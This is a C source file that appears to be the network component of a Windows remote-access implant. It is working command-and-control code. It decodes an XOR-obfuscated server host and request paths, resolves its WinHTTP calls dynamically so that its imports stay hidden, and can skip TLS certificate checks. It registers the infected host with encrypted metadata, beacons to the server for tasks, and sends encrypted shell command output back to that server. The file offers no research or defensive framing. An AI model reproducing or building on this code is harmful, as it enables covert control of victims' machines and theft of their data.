#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include "http.h"
#include "crypto.h"
#include "protocol.h"
#include "config.h"
#include "obf.h"
#include "obf_strings.h"
#include "../../include/dynapi.h"

/* g_whost is lazily initialized. Not thread-safe — call http_request at least
   once on the main thread before spawning any worker threads. */
static wchar_t g_whost[256] = {0};

static void init_whost(void) {
    if (g_whost[0] == L'\0') {
        char _host[ENC_SERVER_HOST_LEN + 1];
        xor_dec(_host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);
        fnMultiByteToWideChar(CP_ACP, 0, _host, -1, g_whost, 256);
    }
}

int http_request(const char *method, const char *path,
                 const uint8_t *body, DWORD body_len,
                 uint8_t *resp_buf, DWORD resp_buf_size) {
    init_whost();

    wchar_t wmethod[8];
    fnMultiByteToWideChar(CP_ACP, 0, method, -1, wmethod, 8);
    wchar_t wpath[256];
    fnMultiByteToWideChar(CP_ACP, 0, path, -1, wpath, 256);

    wchar_t _ua[ENC_USER_AGENT_LEN + 1];
    xor_dec_w(_ua, ENC_USER_AGENT, ENC_USER_AGENT_LEN);
    HINTERNET hSession = fnWinHttpOpen(_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = fnWinHttpConnect(hSession, g_whost, (INTERNET_PORT)SERVER_PORT, 0);
    if (!hConnect) {
        fnWinHttpCloseHandle(hSession);
        return -1;
    }

    DWORD req_flags = 0;
#ifdef USE_HTTPS
    req_flags = WINHTTP_FLAG_SECURE;
#endif
    HINTERNET hRequest = fnWinHttpOpenRequest(hConnect, wmethod, wpath, NULL,
                                              WINHTTP_NO_REFERER,
                                              WINHTTP_DEFAULT_ACCEPT_TYPES, req_flags);
    if (!hRequest) {
        fnWinHttpCloseHandle(hConnect);
        fnWinHttpCloseHandle(hSession);
        return -1;
    }

#ifdef IGNORE_CERT_ERRORS
    /* Self-signed cert: suppress TLS validation errors.
       Must be called after WinHttpOpenRequest and before WinHttpSendRequest. */
    DWORD cert_ignore = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                      | SECURITY_FLAG_IGNORE_UNKNOWN_CA
                      | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
                      | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    fnWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                       &cert_ignore, sizeof(cert_ignore));
#endif

    wchar_t _ct[ENC_CONTENT_TYPE_LEN + 1];
    xor_dec_w(_ct, ENC_CONTENT_TYPE, ENC_CONTENT_TYPE_LEN);
    LPCWSTR headers = (body_len > 0) ? _ct : WINHTTP_NO_ADDITIONAL_HEADERS;
    DWORD   hdr_len = (body_len > 0) ? (DWORD)-1L : 0;

    BOOL ok = fnWinHttpSendRequest(hRequest, headers, hdr_len,
                                   (LPVOID)body, body_len, body_len, 0);
    if (!ok || !fnWinHttpReceiveResponse(hRequest, NULL)) {
        fnWinHttpCloseHandle(hRequest);
        fnWinHttpCloseHandle(hConnect);
        fnWinHttpCloseHandle(hSession);
        return -1;
    }

    /* Check HTTP status code — non-200 treated as error */
    DWORD status_code = 0;
    DWORD status_len = sizeof(status_code);
    if (!fnWinHttpQueryHeaders(hRequest,
                               WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                               WINHTTP_HEADER_NAME_BY_INDEX,
                               &status_code, &status_len,
                               WINHTTP_NO_HEADER_INDEX)
        || status_code != 200) {
        fnWinHttpCloseHandle(hRequest);
        fnWinHttpCloseHandle(hConnect);
        fnWinHttpCloseHandle(hSession);
        return -1;
    }

    DWORD total = 0, bytes_read = 0, available = 0;
    do {
        available = 0;
        if (!fnWinHttpQueryDataAvailable(hRequest, &available)) break;
        if (available == 0) break;
        if (total + available > resp_buf_size) available = resp_buf_size - total;
        if (!fnWinHttpReadData(hRequest, resp_buf + total, available, &bytes_read)) break;
        total += bytes_read;
    } while (bytes_read > 0 && total < resp_buf_size);

    fnWinHttpCloseHandle(hRequest);
    fnWinHttpCloseHandle(hConnect);
    fnWinHttpCloseHandle(hSession);
    return (int)total;
}

int do_register(const char *pubkey_pem, const implant_metadata_t *meta) {
    uint8_t plain[512];
    int plain_len = 0;
    encode_metadata(meta, plain, &plain_len);

    uint8_t encrypted[512];
    DWORD enc_len = sizeof(encrypted);
    if (rsa_encrypt_pubkey(pubkey_pem, plain, (DWORD)plain_len, encrypted, &enc_len) != 0)
        return -1;

    uint8_t resp[16];
    char _path_reg[ENC_PATH_REGISTER_LEN + 1];
    xor_dec(_path_reg, ENC_PATH_REGISTER, ENC_PATH_REGISTER_LEN);
    char _post1[ENC_HTTP_POST_LEN + 1];
    xor_dec(_post1, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
    int n = http_request(_post1, _path_reg, encrypted, enc_len, resp, sizeof(resp));
    return (n >= 0) ? 0 : -1;
}

int do_checkin(uint32_t beacon_id, uint8_t *out_buf, DWORD *out_len) {
    uint8_t body[4];
    body[0] = (uint8_t)(beacon_id & 0xFF);
    body[1] = (uint8_t)((beacon_id >> 8) & 0xFF);
    body[2] = (uint8_t)((beacon_id >> 16) & 0xFF);
    body[3] = (uint8_t)((beacon_id >> 24) & 0xFF);

    char _path_chk[ENC_PATH_CHECKIN_LEN + 1];
    xor_dec(_path_chk, ENC_PATH_CHECKIN, ENC_PATH_CHECKIN_LEN);
    char _post2[ENC_HTTP_POST_LEN + 1];
    xor_dec(_post2, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
    int n = http_request(_post2, _path_chk, body, 4, out_buf, *out_len);
    if (n < 0) return -1;
    *out_len = (DWORD)n;
    return 0;
}

int send_result(uint32_t beacon_id, uint32_t label, uint16_t flags,
                const char *output, const uint8_t session_key[32]) {
    /* Build plaintext: TaskHeader(16) + RunRep(4 + output_len) */
    DWORD out_len = (DWORD)strlen(output);
    if (out_len > 65536) out_len = 65536;
    DWORD plain_len = 16 + 4 + out_len;
    uint8_t *plain = (uint8_t *)malloc(plain_len);
    if (!plain) return -1;

    plain[16] = (uint8_t)(out_len & 0xFF);
    plain[17] = (uint8_t)((out_len >> 8) & 0xFF);
    plain[18] = (uint8_t)((out_len >> 16) & 0xFF);
    plain[19] = (uint8_t)((out_len >> 24) & 0xFF);
    memcpy(plain + 20, output, out_len);

    task_header_t hdr = {
        .type       = TASK_RUN,
        .code       = CODE_RUN_SHELL,
        .flags      = flags,
        .label      = label,
        .identifier = 0,
        .length     = 4 + out_len
    };
    encode_header(&hdr, plain);

    /* Encrypt */
    uint8_t *encrypted = (uint8_t *)malloc(plain_len + 64);
    if (!encrypted) { free(plain); return -1; }
    DWORD enc_len = plain_len + 64;
    if (aes_encrypt(session_key, plain, plain_len, encrypted, &enc_len) != 0) {
        free(plain);
        free(encrypted);
        return -1;
    }
    free(plain);

    /* Body: beacon_id(4 bytes LE) + encrypted */
    DWORD body_len = 4 + enc_len;
    uint8_t *body = (uint8_t *)malloc(body_len);
    if (!body) {
        free(encrypted);
        return -1;
    }
    body[0] = (uint8_t)(beacon_id & 0xFF);
    body[1] = (uint8_t)((beacon_id >> 8) & 0xFF);
    body[2] = (uint8_t)((beacon_id >> 16) & 0xFF);
    body[3] = (uint8_t)((beacon_id >> 24) & 0xFF);
    memcpy(body + 4, encrypted, enc_len);

    uint8_t resp[16];
    char _path_res[ENC_PATH_RESULT_LEN + 1];
    xor_dec(_path_res, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);
    char _post3[ENC_HTTP_POST_LEN + 1];
    xor_dec(_post3, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
    int n = http_request(_post3, _path_res, body, body_len, resp, sizeof(resp));
    free(body);
    free(encrypted);
    return (n >= 0) ? 0 : -1;
}

int send_result_raw(uint32_t beacon_id, uint32_t label, uint8_t type,
                    uint16_t flags, uint32_t identifier,
                    const uint8_t *data, uint32_t data_len,
                    const uint8_t session_key[32]) {
    DWORD plain_len = 16 + data_len;
    uint8_t *plain = (uint8_t *)fnLocalAlloc(LPTR, plain_len);
    if (!plain) return -1;

    task_header_t hdr;
    hdr.type       = type;
    hdr.code       = 0;
    hdr.flags      = flags;
    hdr.label      = label;
    hdr.identifier = identifier;
    hdr.length     = data_len;
    encode_header(&hdr, plain);
    if (data_len > 0 && data) memcpy(plain + 16, data, data_len);

    /* aes_encrypt output: IV(16) + HMAC(32) + AES-CBC(PKCS7(plain)) */
    DWORD enc_body_max = plain_len + 64;
    uint8_t *msg = (uint8_t *)fnLocalAlloc(LPTR, 4 + enc_body_max);
    if (!msg) { fnLocalFree(plain); return -1; }

    /* Prepend beacon_id (4 bytes, little-endian) */
    msg[0] = (uint8_t)(beacon_id & 0xFF);
    msg[1] = (uint8_t)((beacon_id >> 8) & 0xFF);
    msg[2] = (uint8_t)((beacon_id >> 16) & 0xFF);
    msg[3] = (uint8_t)((beacon_id >> 24) & 0xFF);

    DWORD enc_len = enc_body_max;
    int ok = aes_encrypt(session_key, plain, plain_len, msg + 4, &enc_len);
    fnLocalFree(plain);
    if (ok != 0) { fnLocalFree(msg); return -1; }

    char _path[ENC_PATH_RESULT_LEN + 1]; xor_dec(_path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);
    char _post[ENC_HTTP_POST_LEN + 1];   xor_dec(_post, ENC_HTTP_POST,   ENC_HTTP_POST_LEN);
    uint8_t resp[64];
    int r = http_request(_post, _path, msg, 4 + enc_len, resp, sizeof(resp));
    fnLocalFree(msg);
    return r >= 0 ? 0 : -1;
}
